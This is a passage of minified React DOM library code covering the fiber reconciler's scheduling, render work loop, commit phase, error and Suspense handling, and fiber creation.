            if (null === d && 3 === a.tag) e = a.stateNode;
            else
                for (; null !== d; ) {
                    if (((c = d.alternate), d.childExpirationTime < b && (d.childExpirationTime = b), null !== c && c.childExpirationTime < b && (c.childExpirationTime = b), null === d.return && 3 === d.tag)) {
                        e = d.stateNode;
                        break;
                    }
                    d = d.return;
                }
            return null !== e && (T === e && (Bg(b), S === vi && xi(e, U)), yi(e, b)), e;
        }
        function zj(a) {
            var b = a.lastExpiredTime;
            if (0 !== b) return b;
            if (!Aj(a, (b = a.firstPendingTime))) return b;
            var c = a.lastPingedTime;
            return 2 >= (a = c > (a = a.nextKnownPendingLevel) ? c : a) && b !== a ? 0 : a;
        }
        function Z(a) {
            if (0 !== a.lastExpiredTime) (a.callbackExpirationTime = 1073741823), (a.callbackPriority = 99), (a.callbackNode = eg(yj.bind(null, a)));
            else {
                var b = zj(a),
                    c = a.callbackNode;
                if (0 === b) null !== c && ((a.callbackNode = null), (a.callbackExpirationTime = 0), (a.callbackPriority = 90));
                else {
                    var d = Gg();
                    if ((1073741823 === b ? (d = 99) : 1 === b || 2 === b ? (d = 95) : (d = 0 >= (d = 10 * (1073741821 - b) - 10 * (1073741821 - d)) ? 99 : 250 >= d ? 98 : 5250 >= d ? 97 : 95), null !== c)) {
                        var e = a.callbackPriority;
                        if (a.callbackExpirationTime === b && e >= d) return;
                        c !== Tf && Kf(c);
                    }
                    (a.callbackExpirationTime = b), (a.callbackPriority = d), (b = 1073741823 === b ? eg(yj.bind(null, a)) : dg(d, Bj.bind(null, a), { timeout: 10 * (1073741821 - b) - $f() })), (a.callbackNode = b);
                }
            }
        }
        function Bj(a, b) {
            if (((wj = 0), b)) return Cj(a, (b = Gg())), Z(a), null;
            var c = zj(a);
            if (0 !== c) {
                if (((b = a.callbackNode), 0 != (48 & W))) throw Error(u(327));
                if ((Dj(), (a === T && c === U) || Ej(a, c), null !== X)) {
                    var d = W;
                    W |= 16;
                    for (var e = Fj(); ; )
                        try {
                            Gj();
                            break;
                        } catch (h) {
                            Hj(a, h);
                        }
                    if ((ng(), (W = d), (cj.current = e), 1 === S)) throw ((b = kj), Ej(a, c), xi(a, c), Z(a), b);
                    if (null === X)
                        switch (((e = a.finishedWork = a.current.alternate), (a.finishedExpirationTime = c), (d = S), (T = null), d)) {
                            case ti:
                            case 1:
                                throw Error(u(345));
                            case 2:
                                Cj(a, 2 < c ? 2 : c);
                                break;
                            case ui:
                                if ((xi(a, c), c === (d = a.lastSuspendedTime) && (a.nextKnownPendingLevel = Ij(e)), 1073741823 === lj && 10 < (e = Ti + 500 - $f()))) {
                                    if (oj) {
                                        var f = a.lastPingedTime;
                                        if (0 === f || f >= c) {
                                            (a.lastPingedTime = c), Ej(a, c);
                                            break;
                                        }
                                    }
                                    if (0 !== (f = zj(a)) && f !== c) break;
                                    if (0 !== d && d !== c) {
                                        a.lastPingedTime = d;
                                        break;
                                    }
                                    a.timeoutHandle = Hd(Jj.bind(null, a), e);
                                    break;
                                }
                                Jj(a);
                                break;
                            case vi:
                                if ((xi(a, c), c === (d = a.lastSuspendedTime) && (a.nextKnownPendingLevel = Ij(e)), oj && (0 === (e = a.lastPingedTime) || e >= c))) {
                                    (a.lastPingedTime = c), Ej(a, c);
                                    break;
                                }
                                if (0 !== (e = zj(a)) && e !== c) break;
                                if (0 !== d && d !== c) {
                                    a.lastPingedTime = d;
                                    break;
                                }
                                if (
                                    (1073741823 !== mj
                                        ? (d = 10 * (1073741821 - mj) - $f())
                                        : 1073741823 === lj
                                        ? (d = 0)
                                        : ((d = 10 * (1073741821 - lj) - 5e3),
                                          0 > (d = (e = $f()) - d) && (d = 0),
                                          (c = 10 * (1073741821 - c) - e) < (d = (120 > d ? 120 : 480 > d ? 480 : 1080 > d ? 1080 : 1920 > d ? 1920 : 3e3 > d ? 3e3 : 4320 > d ? 4320 : 1960 * bj(d / 1960)) - d) && (d = c)),
                                    10 < d)
                                ) {
                                    a.timeoutHandle = Hd(Jj.bind(null, a), d);
                                    break;
                                }
                                Jj(a);
                                break;
                            case 5:
                                if (1073741823 !== lj && null !== nj) {
                                    f = lj;
                                    var g = nj;
                                    if ((0 >= (d = 0 | g.busyMinDurationMs) ? (d = 0) : ((e = 0 | g.busyDelayMs), (d = (f = $f() - (10 * (1073741821 - f) - (0 | g.timeoutMs || 5e3))) <= e ? 0 : e + d - f)), 10 < d)) {
                                        xi(a, c), (a.timeoutHandle = Hd(Jj.bind(null, a), d));
                                        break;
                                    }
                                }
                                Jj(a);
                                break;
                            default:
                                throw Error(u(329));
                        }
                    if ((Z(a), a.callbackNode === b)) return Bj.bind(null, a);
                }
            }
            return null;
        }
        function yj(a) {
            var b = a.lastExpiredTime;
            if (((b = 0 !== b ? b : 1073741823), 0 != (48 & W))) throw Error(u(327));
            if ((Dj(), (a === T && b === U) || Ej(a, b), null !== X)) {
                var c = W;
                W |= 16;
                for (var d = Fj(); ; )
                    try {
                        Kj();
                        break;
                    } catch (e) {
                        Hj(a, e);
                    }
                if ((ng(), (W = c), (cj.current = d), 1 === S)) throw ((c = kj), Ej(a, b), xi(a, b), Z(a), c);
                if (null !== X) throw Error(u(261));
                (a.finishedWork = a.current.alternate), (a.finishedExpirationTime = b), (T = null), Jj(a), Z(a);
            }
            return null;
        }
        function Mj(a, b) {
            var c = W;
            W |= 1;
            try {
                return a(b);
            } finally {
                0 === (W = c) && gg();
            }
        }
        function Nj(a, b) {
            var c = W;
            (W &= -2), (W |= 8);
            try {
                return a(b);
            } finally {
                0 === (W = c) && gg();
            }
        }
        function Ej(a, b) {
            (a.finishedWork = null), (a.finishedExpirationTime = 0);
            var c = a.timeoutHandle;
            if ((-1 !== c && ((a.timeoutHandle = -1), Id(c)), null !== X))
                for (c = X.return; null !== c; ) {
                    var d = c;
                    switch (d.tag) {
                        case 1:
                            null != (d = d.type.childContextTypes) && Df();
                            break;
                        case 3:
                            eh(), H(K), H(J);
                            break;
                        case 5:
                            gh(d);
                            break;
                        case 4:
                            eh();
                            break;
                        case 13:
                        case 19:
                            H(M);
                            break;
                        case 10:
                            og(d);
                    }
                    c = c.return;
                }
            (T = a), (X = Sg(a.current, null)), (U = b), (S = ti), (kj = null), (mj = lj = 1073741823), (nj = null), (wi = 0), (oj = !1);
        }
        function Hj(a, b) {
            for (;;) {
                try {
                    if ((ng(), (jh.current = sh), mh))
                        for (var c = N.memoizedState; null !== c; ) {
                            var d = c.queue;
                            null !== d && (d.pending = null), (c = c.next);
                        }
                    if (((lh = 0), (P = O = N = null), (mh = !1), null === X || null === X.return)) return (S = 1), (kj = b), (X = null);
                    a: {
                        var e = a,
                            f = X.return,
                            g = X,
                            h = b;
                        if (((b = U), (g.effectTag |= 2048), (g.firstEffect = g.lastEffect = null), null !== h && "object" == typeof h && "function" == typeof h.then)) {
                            var k = h;
                            if (0 == (2 & g.mode)) {
                                var l = g.alternate;
                                l ? ((g.updateQueue = l.updateQueue), (g.memoizedState = l.memoizedState), (g.expirationTime = l.expirationTime)) : ((g.updateQueue = null), (g.memoizedState = null));
                            }
                            var m = 0 != (1 & M.current),
                                p = f;
                            do {
                                var x;
                                if ((x = 13 === p.tag)) {
                                    var z = p.memoizedState;
                                    if (null !== z) x = null !== z.dehydrated;
                                    else {
                                        var ca = p.memoizedProps;
                                        x = void 0 !== ca.fallback && (!0 !== ca.unstable_avoidThisFallback || !m);
                                    }
                                }
                                if (x) {
                                    var D = p.updateQueue;
                                    if (null === D) {
                                        var t = new Set();
                                        t.add(k), (p.updateQueue = t);
                                    } else D.add(k);
                                    if (0 == (2 & p.mode)) {
                                        if (((p.effectTag |= 64), (g.effectTag &= -2981), 1 === g.tag))
                                            if (null === g.alternate) g.tag = 17;
                                            else {
                                                var y = wg(1073741823, null);
                                                (y.tag = 2), xg(g, y);
                                            }
                                        g.expirationTime = 1073741823;
                                        break a;
                                    }
                                    (h = void 0), (g = b);
                                    var A = e.pingCache;
                                    if ((null === A ? ((A = e.pingCache = new Wi()), (h = new Set()), A.set(k, h)) : void 0 === (h = A.get(k)) && ((h = new Set()), A.set(k, h)), !h.has(g))) {
                                        h.add(g);
                                        var q = Oj.bind(null, e, k, g);
                                        k.then(q, q);
                                    }
                                    (p.effectTag |= 4096), (p.expirationTime = b);
                                    break a;
                                }
                                p = p.return;
                            } while (null !== p);
                            h = Error(
                                (pb(g.type) || "A React component") +
                                    " suspended while rendering, but no fallback UI was specified.\n\nAdd a <Suspense fallback=...> component higher in the tree to provide a loading indicator or placeholder to display." +
                                    qb(g)
                            );
                        }
                        5 !== S && (S = 2), (h = Ai(h, g)), (p = f);
                        do {
                            switch (p.tag) {
                                case 3:
                                    (k = h), (p.effectTag |= 4096), (p.expirationTime = b), yg(p, Xi(p, k, b));
                                    break a;
                                case 1:
                                    k = h;
                                    var w = p.type,
                                        ub = p.stateNode;
                                    if (0 == (64 & p.effectTag) && ("function" == typeof w.getDerivedStateFromError || (null !== ub && "function" == typeof ub.componentDidCatch && (null === aj || !aj.has(ub))))) {
                                        (p.effectTag |= 4096), (p.expirationTime = b), yg(p, $i(p, k, b));
                                        break a;
                                    }
                            }
                            p = p.return;
                        } while (null !== p);
                    }
                    X = Pj(X);
                } catch (Xc) {
                    b = Xc;
                    continue;
                }
                break;
            }
        }
        function Fj() {
            var a = cj.current;
            return (cj.current = sh), null === a ? sh : a;
        }
        function Ag(a, b) {
            a < lj && 2 < a && (lj = a), null !== b && a < mj && 2 < a && ((mj = a), (nj = b));
        }
        function Bg(a) {
            a > wi && (wi = a);
        }
        function Kj() {
            for (; null !== X; ) X = Qj(X);
        }
        function Gj() {
            for (; null !== X && !Uf(); ) X = Qj(X);
        }
        function Qj(a) {
            var b = Rj(a.alternate, a, U);
            return (a.memoizedProps = a.pendingProps), null === b && (b = Pj(a)), (dj.current = null), b;
        }
        function Pj(a) {
            X = a;
            do {
                var b = X.alternate;
                if (((a = X.return), 0 == (2048 & X.effectTag))) {
                    if (((b = si(b, X, U)), 1 === U || 1 !== X.childExpirationTime)) {
                        for (var c = 0, d = X.child; null !== d; ) {
                            var e = d.expirationTime,
                                f = d.childExpirationTime;
                            e > c && (c = e), f > c && (c = f), (d = d.sibling);
                        }
                        X.childExpirationTime = c;
                    }
                    if (null !== b) return b;
                    null !== a &&
                        0 == (2048 & a.effectTag) &&
                        (null === a.firstEffect && (a.firstEffect = X.firstEffect),
                        null !== X.lastEffect && (null !== a.lastEffect && (a.lastEffect.nextEffect = X.firstEffect), (a.lastEffect = X.lastEffect)),
                        1 < X.effectTag && (null !== a.lastEffect ? (a.lastEffect.nextEffect = X) : (a.firstEffect = X), (a.lastEffect = X)));
                } else {
                    if (null !== (b = zi(X))) return (b.effectTag &= 2047), b;
                    null !== a && ((a.firstEffect = a.lastEffect = null), (a.effectTag |= 2048));
                }
                if (null !== (b = X.sibling)) return b;
                X = a;
            } while (null !== X);
            return S === ti && (S = 5), null;
        }
        function Ij(a) {
            var b = a.expirationTime;
            return b > (a = a.childExpirationTime) ? b : a;
        }
        function Jj(a) {
            var b = ag();
            return cg(99, Sj.bind(null, a, b)), null;
        }
        function Sj(a, b) {
            do {
                Dj();
            } while (null !== rj);
            if (0 != (48 & W)) throw Error(u(327));
            var c = a.finishedWork,
                d = a.finishedExpirationTime;
            if (null === c) return null;
            if (((a.finishedWork = null), (a.finishedExpirationTime = 0), c === a.current)) throw Error(u(177));
            (a.callbackNode = null), (a.callbackExpirationTime = 0), (a.callbackPriority = 90), (a.nextKnownPendingLevel = 0);
            var e = Ij(c);
            if (
                ((a.firstPendingTime = e),
                d <= a.lastSuspendedTime ? (a.firstSuspendedTime = a.lastSuspendedTime = a.nextKnownPendingLevel = 0) : d <= a.firstSuspendedTime && (a.firstSuspendedTime = d - 1),
                d <= a.lastPingedTime && (a.lastPingedTime = 0),
                d <= a.lastExpiredTime && (a.lastExpiredTime = 0),
                a === T && ((X = T = null), (U = 0)),
                1 < c.effectTag ? (null !== c.lastEffect ? ((c.lastEffect.nextEffect = c), (e = c.firstEffect)) : (e = c)) : (e = c.firstEffect),
                null !== e)
            ) {
                var f = W;
                (W |= 32), (dj.current = null), (Dd = fd);
                var g = xd();
                if (yd(g)) {
                    if ("selectionStart" in g) var h = { start: g.selectionStart, end: g.selectionEnd };
                    else
                        a: {
                            var k = (h = ((h = g.ownerDocument) && h.defaultView) || window).getSelection && h.getSelection();
                            if (k && 0 !== k.rangeCount) {
                                h = k.anchorNode;
                                var l = k.anchorOffset,
                                    m = k.focusNode;
                                k = k.focusOffset;
                                try {
                                    h.nodeType, m.nodeType;
                                } catch (wb) {
                                    h = null;
                                    break a;
                                }
                                var p = 0,
                                    x = -1,
                                    z = -1,
                                    ca = 0,
                                    D = 0,
                                    t = g,
                                    y = null;
                                b: for (;;) {
                                    for (var A; t !== h || (0 !== l && 3 !== t.nodeType) || (x = p + l), t !== m || (0 !== k && 3 !== t.nodeType) || (z = p + k), 3 === t.nodeType && (p += t.nodeValue.length), null !== (A = t.firstChild); )
                                        (y = t), (t = A);
                                    for (;;) {
                                        if (t === g) break b;
                                        if ((y === h && ++ca === l && (x = p), y === m && ++D === k && (z = p), null !== (A = t.nextSibling))) break;
                                        y = (t = y).parentNode;
                                    }
                                    t = A;
                                }
                                h = -1 === x || -1 === z ? null : { start: x, end: z };
                            } else h = null;
                        }
                    h = h || { start: 0, end: 0 };
                } else h = null;
                (Ed = { activeElementDetached: null, focusedElem: g, selectionRange: h }), (fd = !1), (Y = e);
                do {
                    try {
                        Tj();
                    } catch (wb) {
                        if (null === Y) throw Error(u(330));
                        Ei(Y, wb), (Y = Y.nextEffect);
                    }
                } while (null !== Y);
                Y = e;
                do {
                    try {
                        for (g = a, h = b; null !== Y; ) {
                            var q = Y.effectTag;
                            if ((16 & q && Rb(Y.stateNode, ""), 128 & q)) {
                                var B = Y.alternate;
                                if (null !== B) {
                                    var w = B.ref;
                                    null !== w && ("function" == typeof w ? w(null) : (w.current = null));
                                }
                            }
                            switch (1038 & q) {
                                case 2:
                                    Pi(Y), (Y.effectTag &= -3);
                                    break;
                                case 6:
                                    Pi(Y), (Y.effectTag &= -3), Si(Y.alternate, Y);
                                    break;
                                case 1024:
                                    Y.effectTag &= -1025;
                                    break;
                                case 1028:
                                    (Y.effectTag &= -1025), Si(Y.alternate, Y);
                                    break;
                                case 4:
                                    Si(Y.alternate, Y);
                                    break;
                                case 8:
                                    Mi(g, (l = Y), h), Ni(l);
                            }
                            Y = Y.nextEffect;
                        }
                    } catch (wb) {
                        if (null === Y) throw Error(u(330));
                        Ei(Y, wb), (Y = Y.nextEffect);
                    }
                } while (null !== Y);
                if (
                    ((w = Ed),
                    (B = xd()),
                    (q = w.focusedElem),
                    (h = w.selectionRange),
                    B !== q &&
                        q &&
                        q.ownerDocument &&
                        (function wd(a, b) {
                            return (
                                !(!a || !b) && (a === b || ((!a || 3 !== a.nodeType) && (b && 3 === b.nodeType ? wd(a, b.parentNode) : "contains" in a ? a.contains(b) : !!a.compareDocumentPosition && !!(16 & a.compareDocumentPosition(b)))))
                            );
                        })(q.ownerDocument.documentElement, q))
                ) {
                    null !== h &&
                        yd(q) &&
                        ((B = h.start),
                        void 0 === (w = h.end) && (w = B),
                        "selectionStart" in q
                            ? ((q.selectionStart = B), (q.selectionEnd = Math.min(w, q.value.length)))
                            : (w = ((B = q.ownerDocument || document) && B.defaultView) || window).getSelection &&
                              ((w = w.getSelection()),
                              (l = q.textContent.length),
                              (g = Math.min(h.start, l)),
                              (h = void 0 === h.end ? g : Math.min(h.end, l)),
                              !w.extend && g > h && ((l = h), (h = g), (g = l)),
                              (l = vd(q, g)),
                              (m = vd(q, h)),
                              l &&
                                  m &&
                                  (1 !== w.rangeCount || w.anchorNode !== l.node || w.anchorOffset !== l.offset || w.focusNode !== m.node || w.focusOffset !== m.offset) &&
                                  ((B = B.createRange()).setStart(l.node, l.offset), w.removeAllRanges(), g > h ? (w.addRange(B), w.extend(m.node, m.offset)) : (B.setEnd(m.node, m.offset), w.addRange(B))))),
                        (B = []);
                    for (w = q; (w = w.parentNode); ) 1 === w.nodeType && B.push({ element: w, left: w.scrollLeft, top: w.scrollTop });
                    for ("function" == typeof q.focus && q.focus(), q = 0; q < B.length; q++) ((w = B[q]).element.scrollLeft = w.left), (w.element.scrollTop = w.top);
                }
                (fd = !!Dd), (Ed = Dd = null), (a.current = c), (Y = e);
                do {
                    try {
                        for (q = a; null !== Y; ) {
                            var ub = Y.effectTag;
                            if ((36 & ub && Ji(q, Y.alternate, Y), 128 & ub)) {
                                B = void 0;
                                var vb = Y.ref;
                                if (null !== vb) {
                                    var Xc = Y.stateNode;
                                    switch (Y.tag) {
                                        case 5:
                                            B = Xc;
                                            break;
                                        default:
                                            B = Xc;
                                    }
                                    "function" == typeof vb ? vb(B) : (vb.current = B);
                                }
                            }
                            Y = Y.nextEffect;
                        }
                    } catch (wb) {
                        if (null === Y) throw Error(u(330));
                        Ei(Y, wb), (Y = Y.nextEffect);
                    }
                } while (null !== Y);
                (Y = null), Vf(), (W = f);
            } else a.current = c;
            if (qj) (qj = !1), (rj = a), (sj = b);
            else for (Y = e; null !== Y; ) (b = Y.nextEffect), (Y.nextEffect = null), (Y = b);
            if ((0 === (b = a.firstPendingTime) && (aj = null), 1073741823 === b ? (a === vj ? uj++ : ((uj = 0), (vj = a))) : (uj = 0), "function" == typeof Uj && Uj(c.stateNode, d), Z(a), Yi)) throw ((Yi = !1), (a = Zi), (Zi = null), a);
            return 0 != (8 & W) || gg(), null;
        }
        function Tj() {
            for (; null !== Y; ) {
                var a = Y.effectTag;
                0 != (256 & a) && Gi(Y.alternate, Y),
                    0 == (512 & a) ||
                        qj ||
                        ((qj = !0),
                        dg(97, function () {
                            return Dj(), null;
                        })),
                    (Y = Y.nextEffect);
            }
        }
        function Dj() {
            if (90 !== sj) {
                var a = 97 < sj ? 97 : sj;
                return (sj = 90), cg(a, Vj);
            }
        }
        function Vj() {
            if (null === rj) return !1;
            var a = rj;
            if (((rj = null), 0 != (48 & W))) throw Error(u(331));
            var b = W;
            for (W |= 32, a = a.current.firstEffect; null !== a; ) {
                try {
                    var c = a;
                    if (0 != (512 & c.effectTag))
                        switch (c.tag) {
                            case 0:
                            case 11:
                            case 15:
                            case 22:
                                Hi(5, c), Ii(5, c);
                        }
                } catch (d) {
                    if (null === a) throw Error(u(330));
                    Ei(a, d);
                }
                (c = a.nextEffect), (a.nextEffect = null), (a = c);
            }
            return (W = b), gg(), !0;
        }
        function Wj(a, b, c) {
            xg(a, (b = Xi(a, (b = Ai(c, b)), 1073741823))), null !== (a = xj(a, 1073741823)) && Z(a);
        }
        function Ei(a, b) {
            if (3 === a.tag) Wj(a, a, b);
            else
                for (var c = a.return; null !== c; ) {
                    if (3 === c.tag) {
                        Wj(c, a, b);
                        break;
                    }
                    if (1 === c.tag) {
                        var d = c.stateNode;
                        if ("function" == typeof c.type.getDerivedStateFromError || ("function" == typeof d.componentDidCatch && (null === aj || !aj.has(d)))) {
                            xg(c, (a = $i(c, (a = Ai(b, a)), 1073741823))), null !== (c = xj(c, 1073741823)) && Z(c);
                            break;
                        }
                    }
                    c = c.return;
                }
        }
        function Oj(a, b, c) {
            var d = a.pingCache;
            null !== d && d.delete(b), T === a && U === c ? (S === vi || (S === ui && 1073741823 === lj && $f() - Ti < 500) ? Ej(a, U) : (oj = !0)) : Aj(a, c) && ((0 !== (b = a.lastPingedTime) && b < c) || ((a.lastPingedTime = c), Z(a)));
        }
        function Vi(a, b) {
            var c = a.stateNode;
            null !== c && c.delete(b), 0 === (b = 0) && (b = Hg((b = Gg()), a, null)), null !== (a = xj(a, b)) && Z(a);
        }
        Rj = function (a, b, c) {
            var d = b.expirationTime;
            if (null !== a) {
                var e = b.pendingProps;
                if (a.memoizedProps !== e || K.current) rg = !0;
                else {
                    if (d < c) {
                        switch (((rg = !1), b.tag)) {
                            case 3:
                                hi(b), Xh();
                                break;
                            case 5:
                                if ((fh(b), 4 & b.mode && 1 !== c && e.hidden)) return (b.expirationTime = b.childExpirationTime = 1), null;
                                break;
                            case 1:
                                L(b.type) && Gf(b);
                                break;
                            case 4:
                                dh(b, b.stateNode.containerInfo);
                                break;
                            case 10:
                                (d = b.memoizedProps.value), (e = b.type._context), I(jg, e._currentValue), (e._currentValue = d);
                                break;
                            case 13:
                                if (null !== b.memoizedState) return 0 !== (d = b.child.childExpirationTime) && d >= c ? ji(a, b, c) : (I(M, 1 & M.current), null !== (b = $h(a, b, c)) ? b.sibling : null);
                                I(M, 1 & M.current);
                                break;
                            case 19:
                                if (((d = b.childExpirationTime >= c), 0 != (64 & a.effectTag))) {
                                    if (d) return mi(a, b, c);
                                    b.effectTag |= 64;
                                }
                                if ((null !== (e = b.memoizedState) && ((e.rendering = null), (e.tail = null)), I(M, M.current), !d)) return null;
                        }
                        return $h(a, b, c);
                    }
                    rg = !1;
                }
            } else rg = !1;
            switch (((b.expirationTime = 0), b.tag)) {
                case 2:
                    if (
                        ((d = b.type),
                        null !== a && ((a.alternate = null), (b.alternate = null), (b.effectTag |= 2)),
                        (a = b.pendingProps),
                        (e = Cf(b, J.current)),
                        qg(b, c),
                        (e = oh(null, b, d, a, e, c)),
                        (b.effectTag |= 1),
                        "object" == typeof e && null !== e && "function" == typeof e.render && void 0 === e.$$typeof)
                    ) {
                        if (((b.tag = 1), (b.memoizedState = null), (b.updateQueue = null), L(d))) {
                            var f = !0;
                            Gf(b);
                        } else f = !1;
                        (b.memoizedState = null !== e.state && void 0 !== e.state ? e.state : null), ug(b);
                        var g = d.getDerivedStateFromProps;
                        "function" == typeof g && Fg(b, d, g, a), (e.updater = Jg), (b.stateNode = e), (e._reactInternalFiber = b), Ng(b, d, a, c), (b = gi(null, b, d, !0, f, c));
                    } else (b.tag = 0), R(null, b, e, c), (b = b.child);
                    return b;
                case 16:
                    a: {
                        if (
                            ((e = b.elementType),
                            null !== a && ((a.alternate = null), (b.alternate = null), (b.effectTag |= 2)),
                            (a = b.pendingProps),
                            (function (a) {
                                if (-1 === a._status) {
                                    a._status = 0;
                                    var b = a._ctor;
                                    (b = b()),
                                        (a._result = b),
                                        b.then(
                                            function (b) {
                                                0 === a._status && ((b = b.default), (a._status = 1), (a._result = b));
                                            },
                                            function (b) {
                                                0 === a._status && ((a._status = 2), (a._result = b));
                                            }
                                        );
                                }
                            })(e),
                            1 !== e._status)
                        )
                            throw e._result;
                        switch (
                            ((e = e._result),
                            (b.type = e),
                            (f = b.tag = (function (a) {
                                if ("function" == typeof a) return bi(a) ? 1 : 0;
                                if (null != a) {
                                    if ((a = a.$$typeof) === gb) return 11;
                                    if (a === jb) return 14;
                                }
                                return 2;
                            })(e)),
                            (a = ig(e, a)),
                            f)
                        ) {
                            case 0:
                                b = di(null, b, e, a, c);
                                break a;
                            case 1:
                                b = fi(null, b, e, a, c);
                                break a;
                            case 11:
                                b = Zh(null, b, e, a, c);
                                break a;
                            case 14:
                                b = ai(null, b, e, ig(e.type, a), d, c);
                                break a;
                        }
                        throw Error(u(306, e, ""));
                    }
                    return b;
                case 0:
                    return (d = b.type), (e = b.pendingProps), di(a, b, d, (e = b.elementType === d ? e : ig(d, e)), c);
                case 1:
                    return (d = b.type), (e = b.pendingProps), fi(a, b, d, (e = b.elementType === d ? e : ig(d, e)), c);
                case 3:
                    if ((hi(b), (d = b.updateQueue), null === a || null === d)) throw Error(u(282));
                    if (((d = b.pendingProps), (e = null !== (e = b.memoizedState) ? e.element : null), vg(a, b), zg(b, d, null, c), (d = b.memoizedState.element) === e)) Xh(), (b = $h(a, b, c));
                    else {
                        if (((e = b.stateNode.hydrate) && ((Ph = Jd(b.stateNode.containerInfo.firstChild)), (Oh = b), (e = Qh = !0)), e))
                            for (c = Yg(b, null, d, c), b.child = c; c; ) (c.effectTag = (-3 & c.effectTag) | 1024), (c = c.sibling);
                        else R(a, b, d, c), Xh();
                        b = b.child;
                    }
                    return b;
                case 5:
                    return (
                        fh(b),
                        null === a && Uh(b),
                        (d = b.type),
                        (e = b.pendingProps),
                        (f = null !== a ? a.memoizedProps : null),
                        (g = e.children),
                        Gd(d, e) ? (g = null) : null !== f && Gd(d, f) && (b.effectTag |= 16),
                        ei(a, b),
                        4 & b.mode && 1 !== c && e.hidden ? ((b.expirationTime = b.childExpirationTime = 1), (b = null)) : (R(a, b, g, c), (b = b.child)),
                        b
                    );
                case 6:
                    return null === a && Uh(b), null;
                case 13:
                    return ji(a, b, c);
                case 4:
                    return dh(b, b.stateNode.containerInfo), (d = b.pendingProps), null === a ? (b.child = Xg(b, null, d, c)) : R(a, b, d, c), b.child;
                case 11:
                    return (d = b.type), (e = b.pendingProps), Zh(a, b, d, (e = b.elementType === d ? e : ig(d, e)), c);
                case 7:
                    return R(a, b, b.pendingProps, c), b.child;
                case 8:
                case 12:
                    return R(a, b, b.pendingProps.children, c), b.child;
                case 10:
                    a: {
                        (d = b.type._context), (e = b.pendingProps), (g = b.memoizedProps), (f = e.value);
                        var h = b.type._context;
                        if ((I(jg, h._currentValue), (h._currentValue = f), null !== g))
                            if (((h = g.value), 0 === (f = $e(h, f) ? 0 : 0 | ("function" == typeof d._calculateChangedBits ? d._calculateChangedBits(h, f) : 1073741823)))) {
                                if (g.children === e.children && !K.current) {
                                    b = $h(a, b, c);
                                    break a;
                                }
                            } else
                                for (null !== (h = b.child) && (h.return = b); null !== h; ) {
                                    var k = h.dependencies;
                                    if (null !== k) {
                                        g = h.child;
                                        for (var l = k.firstContext; null !== l; ) {
                                            if (l.context === d && 0 != (l.observedBits & f)) {
                                                1 === h.tag && (((l = wg(c, null)).tag = 2), xg(h, l)),
                                                    h.expirationTime < c && (h.expirationTime = c),
                                                    null !== (l = h.alternate) && l.expirationTime < c && (l.expirationTime = c),
                                                    pg(h.return, c),
                                                    k.expirationTime < c && (k.expirationTime = c);
                                                break;
                                            }
                                            l = l.next;
                                        }
                                    } else g = 10 === h.tag && h.type === b.type ? null : h.child;
                                    if (null !== g) g.return = h;
                                    else
                                        for (g = h; null !== g; ) {
                                            if (g === b) {
                                                g = null;
                                                break;
                                            }
                                            if (null !== (h = g.sibling)) {
                                                (h.return = g.return), (g = h);
                                                break;
                                            }
                                            g = g.return;
                                        }
                                    h = g;
                                }
                        R(a, b, e.children, c), (b = b.child);
                    }
                    return b;
                case 9:
                    return (e = b.type), (d = (f = b.pendingProps).children), qg(b, c), (d = d((e = sg(e, f.unstable_observedBits)))), (b.effectTag |= 1), R(a, b, d, c), b.child;
                case 14:
                    return (f = ig((e = b.type), b.pendingProps)), ai(a, b, e, (f = ig(e.type, f)), d, c);
                case 15:
                    return ci(a, b, b.type, b.pendingProps, d, c);
                case 17:
                    return (
                        (d = b.type),
                        (e = b.pendingProps),
                        (e = b.elementType === d ? e : ig(d, e)),
                        null !== a && ((a.alternate = null), (b.alternate = null), (b.effectTag |= 2)),
                        (b.tag = 1),
                        L(d) ? ((a = !0), Gf(b)) : (a = !1),
                        qg(b, c),
                        Lg(b, d, e),
                        Ng(b, d, e, c),
                        gi(null, b, d, !0, a, c)
                    );
                case 19:
                    return mi(a, b, c);
            }
            throw Error(u(156, b.tag));
        };
        var Uj = null,
            Li = null;
        function Zj(a, b, c, d) {
            (this.tag = a),
                (this.key = c),
                (this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null),
                (this.index = 0),
                (this.ref = null),
                (this.pendingProps = b),
                (this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null),
                (this.mode = d),
                (this.effectTag = 0),
                (this.lastEffect = this.firstEffect = this.nextEffect = null),
                (this.childExpirationTime = this.expirationTime = 0),
                (this.alternate = null);
        }
        function Sh(a, b, c, d) {
            return new Zj(a, b, c, d);
        }
        function bi(a) {
            return !(!(a = a.prototype) || !a.isReactComponent);
        }
        function Sg(a, b) {
            var c = a.alternate;
            return (
                null === c
                    ? (((c = Sh(a.tag, b, a.key, a.mode)).elementType = a.elementType), (c.type = a.type), (c.stateNode = a.stateNode), (c.alternate = a), (a.alternate = c))
                    : ((c.pendingProps = b), (c.effectTag = 0), (c.nextEffect = null), (c.firstEffect = null), (c.lastEffect = null)),
                (c.childExpirationTime = a.childExpirationTime),
                (c.expirationTime = a.expirationTime),
                (c.child = a.child),
                (c.memoizedProps = a.memoizedProps),
                (c.memoizedState = a.memoizedState),
                (c.updateQueue = a.updateQueue),
                (b = a.dependencies),
                (c.dependencies = null === b ? null : { expirationTime: b.expirationTime, firstContext: b.firstContext, responders: b.responders }),
                (c.sibling = a.sibling),
                (c.index = a.index),
                (c.ref = a.ref),
                c
            );
        }
        function Ug(a, b, c, d, e, f) {
            var g = 2;
            if (((d = a), "function" == typeof a)) bi(a) && (g = 1);
            else if ("string" == typeof a) g = 5;
            else
                a: switch (a) {
                    case ab:
                        return Wg(c.children, e, f, b);
                    case fb:
                        (g = 8), (e |= 7);
                        break;
                    case bb:
                        (g = 8), (e |= 1);
                        break;
                    case cb:
                        return ((a = Sh(12, c, b, 8 | e)).elementType = cb), (a.type = cb), (a.expirationTime = f), a;
                    case hb:
                        return ((a = Sh(13, c, b, e)).type = hb), (a.elementType = hb), (a.expirationTime = f), a;
                    case ib:
                        return ((a = Sh(19, c, b, e)).elementType = ib), (a.expirationTime = f), a;
                    default:
                        if ("object" == typeof a && null !== a)
                            switch (a.$$typeof) {
                                case db:
                                    g = 10;
                                    break a;
                                case eb:
                                    g = 9;
                                    break a;
                                case gb:
                                    g = 11;
                                    break a;
                                case jb:
                                    g = 14;
                                    break a;
                                case kb:
                                    (g = 16), (d = null);
                                    break a;
                                case lb:
                                    g = 22;
                                    break a;
                            }
                        throw Error(u(130, null == a ? a : typeof a, ""));
                }
